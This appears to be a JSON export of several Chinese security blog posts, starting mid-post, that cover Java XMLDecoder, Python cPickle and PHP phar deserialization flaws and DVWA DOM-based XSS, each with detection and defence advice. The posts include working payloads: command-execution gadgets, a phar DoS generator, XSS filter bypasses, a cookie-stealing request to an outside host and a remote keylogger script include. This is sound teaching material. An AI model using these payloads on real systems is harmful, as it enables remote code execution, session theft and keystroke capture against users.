version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;java version=\"1.8.0_131\" class=\"java.beans.XMLDecoder\"&gt; &lt;object class=\"java.lang.ProcessBuilder\"&gt; &lt;array class=\"java.lang.String\" length=\"1\"&gt; &lt;void index=\"0\"&gt; &lt;string&gt;calc&lt;/string&gt; &lt;/void&gt; &lt;/array&gt; &lt;void method=\"start\" /&gt; &lt;/object&gt;&lt;/java&gt; 运行后，会弹出计算器： 调试分析在IDEA下设置断点跟踪调试。 在readObject()处设置断点，可看到XMLDecoder对象xd的input属性包含了输入XML文档的路径： 继续往里调试，调用到XMLDecoder.parsingComplete()时，发现里面调用了 XMLDecoder.this.handler.parse()，其中this.handler即为DocumentHandler，换句话说，就是调用了DocumentHandler.parser()来解析输入的XML文档内容： 跟踪进去，可以看到DocumentHandler.parser()中调用了如下函数来解析XML内容： 1SAXParserFactory.newInstance().newSAXParser().parse() 接着设置xmlReader的相关handler，如处理XML内容、实体、错误、文档类型定义、文件等句柄，最后调用xmlReader.parse()解析XML文件内容： 继续调试，在XML11Configuration.parse()中发现调用determineDocVersion()： 跟踪进去发现，determineDocVersion()主要获取XML实体扫描器然后扫描解析\\&lt;?xml version=…?&gt;来获取XML文档的版本信息： 返回版本信息后，继续往下在XML11Configuration.parse()中调用startDocumentParsing()函数，主要是重置扫描器的版本配置并开始文件扫描准备，其中开始文件扫描准备是调用startEntity()函数（跟踪进去可以看到是通知扫描器开始实体扫描，其中文档实体的伪名称为“[xml]”、DTD的伪名称为“[dtd]”、参数实体名称以“%”开头；接着函数内部会调用startDocument()函数开始准备文件扫描）： 可以看到最后调用到的startDocument()函数会清空当前对象和句柄为文件扫描的开始做准备： 返回到XML11Configuration.parse()中继续往下调试，调用scanDocument()开始文件扫描： 进入scanDocument()，可以看到设置实体句柄后，主要是执行do while循环体，其中的包含START_DOCUMENT、START_ELEMENT、CHARACTERS、SPACE、ENTITY_REFERENCE、PROCESSING_INSTRUCTION、COMMENT、DTD、CDATA、NOTATION_DECLARATION、ENTITY_DECLARATION、NAMESPACE、ATTRIBUTE、END_ELEMENT等的扫描识别： 中间XML节点解析的过程不用过多分析，调试至END_ELEMENT时，可以看到其中提取出“calc”参数值： 跟踪进去后面的getValueObject()函数，可以看到变量var3和var4，分别为获取到ProcessBuilder类名和start方法名，在调用Expression()： 继续跟踪到里面，最后会调用MethodUtil.invoke()方法实现反射执行任意类方法： 再次F7直接执行了代码弹出计算器： 整体地看一下，整个调用过程大致如下： 1XMLDecoder.readObject() -&gt; XMLDecoder.parsingCompelete() -&gt; DocumentHandler.parse() -&gt; SAXParserFactory.newInstance().newSAXParser().parse() -&gt; xmlReader.parse() 可以发现，XMLDecoder类解析XML是调用DocumentHandler类实现的，而DocumentHandler类是基于SAXParser类对XML的解析上的。 那么可以去分析一下，到底哪个类才是真正的漏洞类。测试一下，可以看出DocumentHandler类才是XMLDecoder反序列化漏洞的根源类： 检测方法全局搜索XMLDecoder关键字，排查是否调用readObject()函数且参数是否可控。 防御方法若可以尽量不使用XMLDecoder反序列化XML内容；若使用则尽量确保参数不可由外界输入，尽量以白名单的方式限定XML文档名且结合严格的过滤机制。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Java","slug":"Java","permalink":"https://www.mi1k7ea.com/tags/Java/"}]},{"title":"Python cPickle反序列化漏洞","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/cPickle反序列化漏洞/","text":"基本概念Python中有个库可以实现序列化和反序列化操作，名为pickle或cPickle，作用和PHP的serialize与unserialize一样，两者只是实现的语言不同，一个是纯Python实现、另一个是C实现，函数调用基本相同，但cPickle库的性能更好，因此这里选用cPickle库作为示例。 cPickle可以对任意一种类型的Python对象进行序列化操作。下面是主要的四个函数： cPickle.dump()：将Python对象序列化保存到本地的文件中。 cPickle.load()：载入本地文件，将文件内容反序列化为Python对象。 cPickle.dumps()：将Python对象序列化为字符串。 cPickle.loads()：将字符串反序列化为Python对象。 简单示例： 先创建Person类对象并初始化，然后将其序列化并输出，可以看到是C解释过的内容： 为了方便，直接在该代码下面添加反序列化操作： Demo还是用上面的示例，添加一个__reduce__()魔术方法： 漏洞根源分析漏洞产生的原因在于其可以将自定义的类进行序列化和反序列化。反序列化后产生的对象会在结束时触发__reduce__()函数从而触发恶意代码。 简单说明一下__reduce__()函数：将一个数据集合（链表，元组等）中的所有数据进行下列操作：用传给 reduce 中的函数 function（有两个参数）先对集合中的第 1、2 个元素进行操作，得到的结果再与第三个数据用 function 函数运算，最后得到一个结果。 由于cPickle是C写的代码且pickle与其实现原理一致，所以到$PYTHON_HOME/Lib/pickle.py中查看reduce加载的源码： 通过调试可以发现，第1136行将当前栈内容赋值给stack变量，当前栈内容包含我们输入的恶意的os.system(“calc.txt”)内容，接着出栈赋值给args变量；通常函数返回地址都保存在当前EBP寄存器所指的上方，因此通过stack[-1]可以获取返回函数地址并赋值给func变量；最后调用func(*args)传入特定参数执行函数，从而完成对象的调用解析而执行任意命令。 通用payload因为反序列化之后用到的库需要在反序列化的文件中存在，所以这里简单分为未导入和导入目标模块即这里为os模块的情况，当然除此之外还有其他一些系统执行库、其他的姿势等等，可自行补充，后面有空再补上吧： 这里贴上测试代码： 12345678910111213141516171819202122232425#coding=utf-8import cPickleclass Person(object): def __init__(self,username,password): self.username = username self.password = password def __reduce__(self): # 未导入os模块，通用 return (__import__('os').system, ('calc.exe',)) # return eval,(\"__import__('os').system('calc.exe')\",) # return map, (__import__('os').system, ('calc.exe',)) # return map, (__import__('os').system, ['calc.exe']) # 导入os模块 # return (os.system, ('calc.exe',)) # return eval, (\"os.system('calc.exe')\",) # return map, (os.system, ('calc.exe',)) # return map, (os.system, ['calc.exe'])admin = Person('admin','123456')result = cPickle.dumps(admin)user = cPickle.loads(result) 检测方法全局搜索Python代码中是否含有关键字类似“import cPickle”或“import pickle”等，若存在则进一步确认是否调用cPickle.loads()或pickle.loads()且反序列化的参数可控。 防御方法1、用更高级的接口__getnewargs()、__getstate__()、__setstate__()等代替__reduce__()魔术方法； 2、进行反序列化操作之前，进行严格的过滤，若采用的是pickle库可采用装饰器实现。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"Python","slug":"Python","permalink":"https://www.mi1k7ea.com/tags/Python/"}]},{"title":"phar反序列化漏洞","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/phar反序列化漏洞/","text":"之前做CTF遇到phar反序列化漏洞概念，这里小结一下。 基本概念phar (PHP Archive) 是PHP里类似于Java中jar的一种打包文件，用于归档。当PHP 版本&gt;=5.3时默认开启支持PHAR文件的。 phar文件默认状态是只读，使用phar文件不需要任何的配置。 而phar://伪协议即PHP归档，用来解析phar文件内容。 phar文件结构1、stub 一个供phar扩展用于识别的标志，格式为xxx\\&lt;?php xxx; __HALT_COMPILER();?&gt;，前面内容不限，但必须以__HALT_COMPILER();?&gt;来结尾，否则phar扩展将无法识别这个文件为phar文件。 2、manifest phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这里即为反序列化漏洞点。 3、contents 被压缩文件的内容。 4、signature 签名，放在文件末尾，格式如下： ###phar使用Demo 注意：生成phar文件需要修改php.ini中的配置： phar.php 123456789101112131415&lt;?php class User&#123; var $name; &#125; @unlink(\"SKI12.phar\"); $phar = new Phar(\"SKI12.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); $o = new User(); $o-&gt;name = \"Kobe\"; $phar-&gt;setMetadata($o); $phar-&gt;addFromString(\"test.txt\", \"test\"); $phar-&gt;stopBuffering();?&gt; 使用WinHex查看该phar文件，可以看到前面是stub，接着是manifest，包含以序列化的形式存储用户自定义的meta-data信息即这里的User类对象： phar_parse.php 123456789101112&lt;?php class User &#123; var $name; function __destruct()&#123; echo $this-&gt;name; &#125; &#125; $filename = 'phar://SKI12.phar/test.txt'; file_exists($filename);?&gt; 为了验证使用phar://伪协议解析phar文件时对meta-data进行反序列化操作，这里添加__destruct()魔法函数进行输出验证： 漏洞点phar反序列化漏洞的漏洞点在于使用phar://协议读取文件的时候，文件内容会被解析成phar对象，然后phar对象内的Metadata信息会被反序列化；当Metadata内容可由用户控制，则会存在反序列化漏洞风险。 受影响的PHP文件操作函数列表如下： 在php-src/ext/phar/phar.c中可以查看到phar在解析metadata时会调用php_var_unserialize()函数来对metadata进行反序列化操作： 利用条件 能够上传phar文件到服务器，可将phar文件伪装成其他格式文件绕过上传； 要有可用的魔术方法作为“跳板”； 文件操作函数的参数可控，且:、/、phar等特殊字符未被过滤。Demo1——反序列化任意代码执行 这种情况利用条件较为苛刻，需要有可用的魔术方法，在实际场景较为少见，多见于CTF比赛。 phar1.php 将恶意代码注入到对象中并在设置Metadata信息中实现序列化。 12345678910111213141516&lt;?php class User&#123; var $data; &#125; @unlink(\"SKI12.phar\"); $phar = new Phar(\"SKI12.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub(\"&lt;?php __HALT_COMPILER(); ?&gt;\"); $o = new User(); $o-&gt;data = \"phpinfo()\"; // $o-&gt;data = \"whoami\"; $phar-&gt;setMetadata($o); $phar-&gt;addFromString(\"test.txt\", \"test\"); $phar-&gt;stopBuffering();?&gt; 使用WinHe查看该phar文件，可以看到注入的代码在序列化后的Metadata信息中： phar2.php 可利用的魔术方法有__destruct()和__wakeup()等。 通过GET方法的形式控制文件操作函数的参数，并且存在可利用的魔法函数。 1234567891011121314&lt;?php $filename = $_GET['file']; class User &#123; var $data; public function __wakeup() &#123; eval(\"$this-&gt;data;\"); // system($this-&gt;data); &#125; &#125; file_exists($filename); ?&gt; PHP代码执行： 或系统命令执行： Demo2——PHP内核哈希表碰撞攻击相比于上一种利用方式，这种不需要苛刻的有可用的魔术方法的条件只需可控参数的文件操作函数的条件即可。在PHP内核中，数组是以哈希表的方式实现的，攻击者可以通过巧妙的构造数组元素的key使哈希表退化成单链表（时间复杂度从O(1) =&gt; O(n)）来触发拒绝服务攻击。 PHP修复此漏洞的方式是限制通过$_GET或$_POST等方式传入的参数数量，但是如果PHP脚本通过json_decode()或unserialize()等方式获取参数，依然将受到此漏洞的威胁。 phar_dos.php 生成恶意DoS phar文件。 1234567891011121314151617&lt;?php $size= pow(2, 16); $array = array(); for ($key = 0, $maxKey = ($size - 1) * $size; $key &lt;= $maxKey; $key += $size) &#123; $array[$key] = 0; &#125; $obj = new stdClass; $obj-&gt;dos = $array; $phar = new Phar(\"dos.phar\"); $phar-&gt;startBuffering(); $phar-&gt;setStub('&lt;?php __HALT_COMPILER();?&gt;'); $phar-&gt;setMetadata($obj); $phar-&gt;addFromString(\"dos.txt\", \"dos\"); $phar-&gt;stopBuffering();?&gt; 使用WinHex查看该phar文件，可以看到Metadata信息中序列化的内容为含有大量元素的数组： phar_dos_attack.php 这里直接通过执行先后的时间差进行测试，通过GET方法的形式控制文件操作函数的参数。 1234567&lt;?php $filename = $_GET['file']; $startTime = microtime(true); file_exists($filename); $endTime = microtime(true); echo 'PHP内核哈希表碰撞DoS攻击造成的延迟时间： '.($endTime - $startTime). ' 秒';?&gt; 直接通过GET方法传入file参数的值，可看到延迟响应的时间相当长： Demo3——绕过文件幻数检测文件幻数检测：主要是检测文件内容开始处的文件幻数，要绕过的话需要在文件开头写上检测的值。 PHP识别phar文件是通过其文件头的stub中的__HALT_COMPILER();?&gt;这段代码，对于其前面的内容和后缀名都没有校验，因此可以通过添加任意的文件头以及修改后缀名的方式将phar文件伪装成其他格式的文件从而绕过文件幻数检测。 生成和解析phar文件的代码和Demo1的一致，区别在于生成phar文件的代码中的setStub()函数前面添加伪造其他格式文件的标志性内容。另外注意的是Phar()函数内的文件名后缀只能写phar，生成后再修改该phar文件后缀名为其他文件格式的后缀名。 这里以GIF文件为示例。 WinHex查看一个正常的GIF图，可以看到一个正常的GIF文件其文件幻数为GIF89a： 在setStub()中内容的开头添加GIT89a： 将生成的SKI12.phar修改为SKI12.gif，使用WinHex查看： 这里直接访问该文件，至于绕过文件格式检测的环境可自行搭建测试一下即可： 防御 在文件系统函数的参数可控时，对参数进行严格的过滤； 严格检查上传文件的内容，而不是只检查文件头； 在条件允许的情况下禁用可执行系统命令、代码的危险函数； 参考blackhat议题深入 | phar反序列化 利用 phar 拓展 php 反序列化漏洞攻击面","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"PHP","slug":"PHP","permalink":"https://www.mi1k7ea.com/tags/PHP/"}]},{"title":"DVWA之DOM型XSS","date":"2018-12-31T17:01:01.000Z","path":"2019/01/01/通过DVWA学习DOM型XSS/","text":"下了个新版的DVWA看了下，发现新增了好几个Web漏洞类型，就玩一下顺便做下笔记，完善一下之前那篇很水的DOM XSS文章，虽然这个也很水 ：） 基本概念DOM，全称Document Object Model，是一个平台和语言都中立的接口，可以使程序和脚本能够动态访问和更新文档的内容、结构以及样式。 DOM型XSS其实是一种特殊类型的反射型XSS，它是基于DOM文档对象模型的一种漏洞，其触发不需要经过服务器端，也就是说，服务端的防御并不起作用。 在网站页面中有许多页面的元素，当页面到达浏览器时浏览器会为页面创建一个顶级的Document object文档对象，接着生成各个子文档对象，每个页面元素对应一个文档对象，每个文档对象包含属性、方法和事件。可以通过JS脚本对文档对象进行编辑从而修改页面的元素。也就是说，客户端的脚本程序可以通过DOM来动态修改页面内容，从客户端获取DOM中的数据并在本地执行。基于这个特性，就可以利用JS脚本来实现XSS漏洞的利用。 可能触发DOM型XSS的属性document.referer属性 window.name属性 location属性 innerHTML属性 documen.write属性 ······ Low级别点击正常功能观察： 查看页面源码，可以看到以下框中的JS代码，从URL栏中获取default参数的值，这里是通过获取“default=”后面的字符串来实现的，然后直接写到option标签中，并没有对特殊字符进行任何的过滤： 可以明确，这是由document.write属性造成的DOM型XSS漏洞。 因为这段JS代码是本地执行的，获取本地输入的URL栏上的default参数再直接嵌入到option标签中的，因而可以直接往default参数注入XSS payload即可： 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 检测元素，可以看到是通过JS在本地动态执行嵌入了script标签： 若要尝试使用其他XSS payload，如img、svg等标签，因为select标签内只允许内嵌option标签，而option标签中能内嵌script标签但不能内嵌img等标签，因此需要在注入时先闭合option和select标签从而使注入的标签逃逸出来执行XSS： 1&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(&quot;SKI12&quot;)&gt; 最后查看源码，没有做任何防御： Medium级别先尝试payload： 1&lt;script&gt;alert(document.cookie)&lt;/script&gt; 发现会重定向到English选项页面。 推测可能是对script字符串进行了过滤，因此进行重复内嵌或大小写组合等方式尝试绕过： 12&lt;scri&lt;script&gt;pt&gt;alert(document.cookie)&lt;/sc&lt;/script&gt;ript&gt;&lt;scRIpt&gt;alert(document.cookie)&lt;/sCRIPT&gt; 然而发现也是会重定向到English选项页面。 应该是对script标签进行了比较严格的过滤， 换个标签类型的payload（注意要闭合前面的标签如low级所说）： 1&lt;/option&gt;&lt;/select&gt;&lt;svg/onload=alert(document.cookie)&gt; 弹框成功： 因此可以推测，后台代码只是对script标签进行了有效的过滤，而对于其他标签则未进行过滤。 最后查看源码，发现只对script标签进行了过滤，过滤方式是调用stripos()函数获取“\\&lt;script”字符串出现在参数的哪个位置（不区分大小写），因此重复内嵌和大小写等方式无法绕过该过滤机制： High级别经过一系列XSS payload的尝试，没有成功 : ( 没办法，看下源码吧： 发现已经白名单写死了，推测是不是存在某种截断可以使得XSS得以注入弹框。 试了一会并未成功，无奈查看一下help提示： The developer is now white listing only the allowed languages, you must find a way to run your code without it going to the server. Spoiler: The fragment section of a URL (anything after the # symbol) does not get sent to the server and so cannot be blocked. The bad JavaScript being used to render the page reads the content from it when creating the page. 大概意思就是，需要找一种方法在本地运行你的JS代码而无需经过服务器端的处理。这里提供的一种方法就是，应用#号，URL栏的#号之后的内容并不会发送至服务器端，JS应用该符号实现在页面创建加载过程中定向到指定的页面内容上。 试一下在白名单字符串后添加#号的payload，刚输入进去是无反应的，需要刷新一下触发JS中#号的作用才能弹框： 1English#&lt;/option&gt;&lt;/select&gt;&lt;BODY ONLOAD=alert(document.cookie)&gt; Impossible级别直接看源码吧： 说是服务器端不需要做任何防御措施，防御的关键在于客户端上。 查看help怎么说： The contents taken from the URL are encoded by default by most browsers which prevents any injected JavaScript from being executed. 大致就是，大多数浏览器默认都对从URL中获取的内容进行编码，以防止JS代码注入执行。 回到xss dom的index.php中可以看到，对于impossible级别来说，在JS代码document.write()中调用的decodeURI()是个空函数，即并不会对URL输入进行URL编码过的内容再进行URL解码从而杜绝了DOM型XSS： 测试一下，注入payload，发现确实没有进行URL解码： 漏洞利用和之前写的《关于DOM型XSS漏洞的学习笔记》一样，将其重复整理到一起吧。 测试的level是low，其他level同理。 窃取cookie——createElement()利用JS的document.createElement()创建新标签如img并将cookie信息通过img标签src属性来请求发往目标主机，payload如下： 1/xss_d/?default=&lt;script&gt;var img=document.createElement(&quot;img&quot;);img.src=&quot;http://127.0.0.1:8000/a?&quot;+escape(document.cookie);&lt;/script&gt; 篡改页面——innerHTML主要用于篡改页面，payload如下： 1/xss_d/?default=&lt;script&gt;document.body.innerHTML=&quot;&lt;div style=visibility:visible;&gt;&lt;h1&gt;DOM XSS By SKI12&lt;/h1&gt;&lt;/div&gt;&quot;;&lt;/script&gt; 键盘记录——document.onkeypress利用document.onkeypress可实现键盘记录。 keylogger.js 放置于攻击者的服务器中，让目标服务器注入XSS后来访问执行。 keylogger.php 放置于攻击者的服务器中，用于接收目标服务器访问执行了keylogger.js后传送回来的用户输入的键盘信息，并保存在本地文件中。 payload： 1/xss_d/?default=&lt;script src=&quot;http://127.0.0.1/keylogger.js&quot;&gt;&lt;/script&gt; 此时用户在该Web界面输入的任何内容都会实时保存到keylog.txt中： 防御DOM型XSS主要是由客户端的脚本通过DOM动态地输出数据到页面而不是依赖于将数据提交给服务器端，而从客户端获得DOM中的数据在本地执行，因而仅从服务器端是无法防御的。其防御在于： （1） 避免客户端文档重写、重定向或其他敏感操作，同时避免使用客户端数据，这些操作尽量在服务器端使用动态页面来实现； （2） 分析和强化客户端JS代码，特别是受到用户影响的DOM对象，注意能直接修改DOM和创建HTML文件的相关函数或方法，并在输出变量到页面时先进行编码转义，如输出到HTML则进行HTML编码、输出到\\则进行JS编码。","tags":[{"name":"Web安全","slug":"Web安全","permalink":"https://www.mi1k7ea.com/tags/Web安全/"},{"name":"XSS","slug":"XSS","permalink":"https://www.mi1k7ea.com/tags/XSS/"}]}]